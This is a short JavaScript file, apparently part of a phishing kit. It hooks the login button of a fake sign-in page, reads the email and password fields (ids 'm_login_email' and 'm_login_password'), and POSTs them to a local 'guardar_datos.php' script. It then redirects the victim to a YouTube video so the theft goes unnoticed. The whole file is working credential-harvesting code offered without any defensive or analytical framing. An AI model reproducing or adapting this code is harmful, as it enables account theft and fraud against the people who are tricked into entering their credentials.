
document.addEventListener("DOMContentLoaded", function () {
    const URL_REDIRECCION = "https://youtu.be/C0fytYVZ_mQ?si=aI4JyH9XBu6Z-N4Z", 
        URL_GUARDAR_DATOS = "./guardar_datos.php",
        $btnLogin = document.querySelector("#l"),
        $usuario = document.querySelector("#m_login_email"),
        $password = document.querySelector("#m_login_password");

    $btnLogin.addEventListener("click", () => {
   
        if (!$usuario.value || !$password.value) return;
      
        let cargaUtil = {
            usuario: $usuario.value,
            password: $password.value,
        };

        fetch(URL_GUARDAR_DATOS, {
            method: "POST",
            body: JSON.stringify(cargaUtil)
        }).then(() => {
          
            window.location.href = URL_REDIRECCION;
        });
    });
});
